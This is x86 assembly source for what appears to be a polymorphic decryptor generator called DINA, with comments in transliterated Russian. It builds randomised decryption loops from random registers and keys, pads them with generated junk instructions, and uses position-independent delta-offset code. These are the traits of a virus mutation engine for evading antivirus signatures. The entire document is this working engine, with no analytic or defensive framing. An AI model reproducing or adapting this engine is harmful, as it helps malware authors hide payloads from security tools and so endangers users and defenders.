   SizeDinaV1 EQU offset EndDINA - offset DINA
   ;--------------------------------------------------
   include macro.inc
   offset2 MACRO descr
           offset2&descr EQU offset descr - offset DINA-5
           ENDM
   DINA: call $+5
         jmp @Initus
   offset2test_2 EQU offset test_2 - offset DINA-5
   test_1:
   test_2: call $+5
   popER1: pop eax
   ;-----
           db 81h
   addER1: db 0c0h
   addons_:dd 90909090h
   ;-----
                db 66h
   movR2:       db 0B8h
   SIZECRYPTYN: dw 9090h
   ;-----
    MOV_R3_L_KEY: db 0B0h
   _Key:          db 90h
   ;------------
   ; MOV R3_H ,BYTE PTR [ER1+ ADDONS2]
   MOV_R3_H_BYTE_PTR_ER1_ADDONS2:
               db   8ah
       R3_Hc:  db   80h
               dd 00909090h
   ;-----------------------
   ;COM ADD/AND/OR/SUB/XOR     02/22/0A/2A/32
   COM1: db 02h
         db 0c0h
   XOR_R3_1XR3_2:      db 32h
                       db 0c0h
   MOV_BYTE_PTR_ER1_ADDONS2_R3_H:
               db   88h
               db   80h
               dd 00909090h
   INCER1:     db 40h       ; 1 2
    DECR2:     db 66h,48h   ; 2 1
   @OR:     db 66h
            db 0bh
            db 0c0h
   jnz_test_3:db 0fh,85h
              dd -( offset jnz_test_3 - offset MOV_R3_H_BYTE_PTR_ER1_ADDONS2)-7
   COMMANDSADD: db 02,22h,0Ah,2Ah,32h,02
   ;###########################################################
   RandSeed  dd 2394900h
   ww        dw 8405h
   MemHandle1 dd ?
   RelPoin dd ?
   addonsPoint dd ?
   addons2Point dd ?
   addons2_Point dd ?
   jnz_Point DD ?
   SizeOfDecryptor dd ?
   ;SYSTIMESTR:
   ;            dw 1111h
   ;            dw 2222h
   ;            dw ?
   ;            dw ?
   ;            dw ?
   ;            dw ?
   ;            dw ?
   ;            dw 8888h
   _ER1: db 1
   _R2:  db 2
   _R3_1:  db 3
   _R3_2:  db 4
   XOR_R3_ADD  db 5
   offset2 _ER1
   offset2 _R2
   offset2 _R3_1
   offset2 _R3_2
   offset2 XOR_R3_ADD
   ;###########################################################
   lpCodeBuffer   EQU 8
   CodeSize2Crypt EQU 12
   ;###########################################################
   @Initus:
    pop ebx ; EBX = ENtry point
    push ebp
    mov ebp,esp
    mov eax,[ebp+lpCodeBuffer]
    mov edx,[ebp+CodeSize2Crypt]
    pop ebp
    mov esi,ebx
    add esi,offset test_1 - offset DINA -5
    mov ecx,(offset COMMANDSADD  - offset test_2)/4+1
   @InitusL1:            ; Coxpanim skelet
    push dword ptr [esi] ;
    add esi,4            ;
    loop @InitusL1       ;
    push ebx
    offset2 MemHandle1
    offset2 SizeOfDecryptor
    mov [ebx+offset2MemHandle1],eax
    mov [ebx+offset2SizeOfDecryptor],edx
   ; offset2 SYSTIMESTR
   ; mov eax,ebx                ; optemaze !!!
   ; add eax,offset2SYSTIMESTR  ;
    push eax
    call GetSystemTime
    pop ebx
    offset2 RandSeed
    add [ebx+offset2RandSeed],eax
    push 0ffffffh
    call random
    call @ESP
    mov al,byte ptr [ebx+offset2_ER1]
    offset2 popER1
    add byte ptr [ebx+offset2popER1],al
    offset2 addER1
    add byte ptr [ebx+offset2addER1],al
    offset2 INCER1
    add byte ptr [ebx+offset2INCER1],al
    xor eax,eax
    mov ah,byte ptr [ebx+offset2_R3_2]
    push eax
    shl ah,2                   ; Razryad*4
    add ah,byte ptr [ebx+offset2_R3_1]    ; Razryad*4+_R3_1    _R3_1 - nomer registra
    offset2 MOV_R3_L_KEY
    add byte ptr [ebx+offset2MOV_R3_L_KEY],ah
    pop edx
    push edx
    or dh,dh
    je_ Set1
    dec dh
    jmp @@l1
   ;--------------
    @TestR2&eR1:
     cmp byte ptr [ebx+offset2_R2],4
     jnl_ RE1&R2_44
    NoER1: jmp @GenerateCOMwKey
   ;-------------
    Set1: inc dh
    @@l1:  shl dh,1
    mov ax,10h
    imul dh
    mov cx,ax
    mov ax,8
    mov dl,byte ptr [ebx+offset2_R3_1]
    imul dl                 ; PEREVOD RAZRYADA NA 20H
    add al,byte ptr [ebx+offset2_ER1]
    add ax,080h
    add cx,ax
    offset2 R3_Hc
    mov byte ptr [ebx+offset2R3_Hc],cl
    offset2 MOV_BYTE_PTR_ER1_ADDONS2_R3_H
    mov byte ptr [ebx+offset2MOV_BYTE_PTR_ER1_ADDONS2_R3_H+1],cl
    mov dl,byte ptr [ebx+offset2_R2]
    offset2 movR2
    add byte ptr [ebx+offset2movR2],dl
    offset2 DECR2
    add byte ptr [ebx+offset2DECR2+1],dl
    pop edi  ; razryad
    ;push word ptr [COM1]
    @GenerateCOMwKey:
    call GenerateCOMwKey
    inc ebp
    or ebp,ebp
    je_ @TestR2&eR1
    jmp @_l2
    offset2 COM1
    RE1&R2_44: mov word ptr [ebx+offset2COM1],9090h
    @_l2:
    or edi,edi
    jne_ Set_0
    mov edi,100h
    jmp Rzryad_INVERS
    Set_0:
    xor edi,edi
    Rzryad_INVERS:

    push word ptr [ebx+offset2COM1]
    call GenerateCOMwKey
    pop  word ptr [ebx+offset2COM1]

    mov al,byte ptr [ebx+offset2XOR_R3_ADD]
    add al,byte ptr [ebx+offset2_R3_1]
    offset2 XOR_R3_1XR3_2
    add byte ptr [ebx+offset2XOR_R3_1XR3_2+1],al
    mov al,04h
    mov cl,byte ptr [ebx+offset2_R3_2]
    imul cl
    add byte ptr [ebx+offset2XOR_R3_1XR3_2+1],al
   ;@OR
     mov ax,9
     imul byte ptr [ebx+offset2_R2]
     offset2 @OR
     add byte ptr [ebx+offset2@OR+2],al
    mov eax,[ebx+offset2MemHandle1]
    mov edi,eax
    push edi
    xor eax,eax
    mov ecx,4096
   MakeNois:
     push ecx
     push 0fffffh
     call random
    ;mov al,90h
     pop ecx
     stosb
     LOOP MakeNois
    pop edi
    xor ebp,ebp
    inc ebp
   offset2 test_1
   mov esi,ebx
   add esi,offset2test_1
   ;cld
   ;movsw
   ;cld
   ;movsb
   ;
   call Random10@GenerateTrashCommands
    ; call next
    push 50
    call random
    mov [esi+1],eax
    cld
    movsd
    movsb
    offset2 RelPoin
    mov [ebx+offset2RelPoin],edi
    add edi,eax
    ;
   call Random10@GenerateTrashCommands
    ;popER1
    cld
    movsb
   ;
   call Random10@GenerateTrashCommands
   offset2 addonsPoint
   mov [ebx+offset2addonsPoint],edi ;save addonsPoint
   cld
   movsd
   movsw
   ; mov R2,SIZE2CRYPT
   call Random10@GenerateTrashCommands
   mov eax,[ebx+offset2SizeOfDecryptor]
   mov word ptr [esi+2],ax
   cld
   movsd
   ;  MOV_R3_L_KEY
   call Random10@GenerateTrashCommands
   push 0ffh
   call random
   mov byte ptr [esi+1],al ;key
   cld
   movsw
   ; MOV R3_H ,BYTE PTR [ER1+ ADDONS2] size 6b
   call Random10@GenerateTrashCommands
   ;mov al,03eh
   ;cld
   ;stosb
   offset2 addons2Point
   mov [ebx+offset2addons2Point],edi
   cld
   movsd
   movsw
   ; COM1
   call Random10@GenerateTrashCommands
    cld
    movsw
   ;XOR_R3_1XR3_2
   call Random10@GenerateTrashCommands
   cld
   movsw
   ;MOV_BYTE_PTR_ER1_ADDONS2_R3_H
   call Random10@GenerateTrashCommands
   ; mov al,03eh
   ; cld
   ; stosb
   offset2 addons2_Point
   mov [ebx+offset2addons2_Point],edi
   cld
   movsd
   movsw
   ;  INCER1
   call Random10@GenerateTrashCommands
   cld
   movsb
   ; dec r2
   call Random10@GenerateTrashCommands
   cld
   movsw
   ;@OR
   call Random10@GenerateTrashCommands
   cld
   movsw
   movsb
   ;jnz_test_3
   ;call Random10
   xor ebp,ebp
   ;call @GenerateTrashCommands
   offset2 jnz_Point
   mov [ebx+offset2jnz_Point],edi
   cld
   movsd
   movsw
   call Random10
   inc ebp
   call @GenerateTrashCommands
   ;cld
   ;movsb
   ; HacTPoika
     push edi
     mov eax,[ebx+offset2RelPoin]
     sub edi,eax
     push edi
     push edi
     call random
     mov esi,[ebx+offset2addonsPoint]
     mov dword ptr [esi+2],eax
     pop edi
     sub edi,eax
     mov esi,[ebx+offset2addons2Point]
     push esi
     mov dword ptr [esi+2],edi
     mov esi,[ebx+offset2addons2_Point]
     mov dword ptr [esi+2],edi
     pop esi
     mov eax,[ebx+offset2jnz_Point]
     push eax
     sub eax,esi
     add eax,06
     neg eax
     pop esi
     mov [esi+2],eax
     offset2 MemHandle1
     mov eax,[ebx+offset2MemHandle1]
     pop edi
     sub edi,eax
     mov eax,edi

    mov esi,ebx
    add esi,(offset test_1 - offset DINA -5)+((offset COMMANDSADD  - offset test_2)/4+1)*4-4
    mov ecx,(offset COMMANDSADD  - offset test_2)/4+1
   @InitusL2:            ; Vostanovim skelet
    pop  dword ptr [esi] ;
    sub esi,4            ;
    loop @InitusL2       ;
     ret 8
   ;--------------------------------------------
   Random10@GenerateTrashCommands:
   call Random10
   call @GenerateTrashCommands
   ret
   Random10:
    CommandCount EQU 6  ;
    push CommandCount
    call random
    mov ecx,eax
    or eax,eax
    jne_ @l12
    inc ecx
   @l12:
   ret
   @GenerateTrashCommands:
    push esi
    push ecx
    call GenerateTrashCommand
    pop ecx
    pop esi
    loop @GenerateTrashCommands
    ret
   GenerateTrashCommand:
              xor esi,esi
              or ebp,ebp
              jne_ NoFlags
              inc esi
              inc esi
   NoFlags:
              mov eax,4
              sub eax,esi
              push eax
              call random
              add esi,offset trashcommand
              add esi,eax
              cmp byte ptr [esi],50h
              je_ @PushPop
              cmp byte ptr [esi],0ebh
              je_  NOr32
              push 03h
              call random
              test eax,1
              je_ NOr32
              mov eax,066h
              cld
              stosb
   NOr32:     cld
              movsb
              dec esi
              cmp byte ptr [esi],0ebh
              je_  @jmp
              push 63
              call random
              add al,0c0h
              cld
              stosb
              ret
              jmpLength EQU 20
   @jmp:      push jmpLength ;
              call random
              cld
              stosb
              add edi,eax
              ret
   @PushPop:  cld
              movsw
              push 8
              call random
              add byte ptr [edi-1],al
              add byte ptr [edi-2],al
              ret
   trashcommand: db 03Bh,085h,0EBh,50h,58h
   ;*******************************************************************
   ; If EBP=-1 then Bad Generate command
   ;*******************************************************************
   NODX: inc esi
         dec ebp
         jmp @C
   GenerateCOMwKey:
   push ecx
   push edi
   push esi
   xor ebp,ebp
   cmp byte ptr [ebx+offset2_R2],4  ; ( ADD R3_L ,R2_L   IF NOT EBP OR ESI OR EDI ! <
   jnl_ NODX
   @C:
   mov ax,20h
   mov edx,edi    ; razryad
   imul dh
   mov ecx,eax             ; pereveli razryad registra R3_x (COM AH,xx)
   mov ax,8                ;
   mov dl,byte ptr [ebx+offset2_R3_1] ; preshli k COM R3_x,al
   imul dl                 ;
   add cx,ax               ;
                           ;
   mov [ebx+offset2XOR_R3_ADD],cl ;
   mov dl,byte ptr [ebx+offset2_R2]
   add cL,dl  ;  4 or 0 ?
   push ecx
   push 0fffffh
   call random
   pop ecx
   test eax,1
   je_ nono
   add cl,4
   nono:
   add byte ptr [ebx+offset2COM1+1] ,cl
   push 05
   call random
   offset2 COMMANDSADD
   mov al,byte ptr [ebx+offset2COMMANDSADD+eax]
   mov byte ptr [ebx+offset2COM1],al
   pop esi
   pop edi
   pop ecx
   ret
   ;************************************************************************
   random:
   pop eax
   pop edx
   push edi
   push edx
   push eax
   ;RandSeed  dd 2394900h
   ;ww        dw 8405h
   push ebx
   pop  edi
   xor eax,eax
   mov ax,WORD PTR [edi+offset2RandSeed ]
   mov bx,WORD PTR [edi+offset2RandSeed+2]
   mov cx,ax
   offset2 ww
   mul word ptr [edi+offset2ww]
   SHL cx,1
   shl cx,1
   shl cx,1
   add dx,cx
   add dx,bx
   shl bx,1
   shl bx,1
   add dx,bx
   add dh,bl
   mov cl,05
   shl bx,cl
   add ax,0001
   adc dx,0
   mov WORD PTR [edi+offset2RandSeed],ax
   mov WORD PTR [edi+offset2RandSeed+2],dx
   mov Ebx,Esp
   mov cx,dx
   mul ss:word ptr [Ebx+4]
   mov ax,cx
   mov cx,dx
   mul ss:word ptr [Ebx+4]
   add ax,cx
   adc dx,00
   mov ax,dx
   mov ebx,edi
   pop edx
   pop edi
   pop edi
   jmp edx
   ; generate registers
   ;-------------------------------------------------------
   @ESP:
   push 8
   call random
   mov byte ptr [ebx+offset2_ER1],al
   cmp al,4
   je_ @ESP
   @ESP2:
   push 8
   call random
   mov byte ptr [ebx+offset2_R2],al
   cmp al,4
   je_ @ESP2
   cmp byte ptr [ebx+offset2_ER1],al
   je_  @ESP2
   @ESP3:
   push 4
   call random
   mov byte ptr [ebx+offset2_R3_1],al
   cmp byte ptr [ebx+offset2_ER1],al
   je_ @ESP3
   cmp byte ptr [ebx+offset2_R2],al
   je_ @ESP3
   PUSH 02
   CALL random
   MOV BYTE PTR [ebx+offset2_R3_2],AL
   ret
   EndDINA:
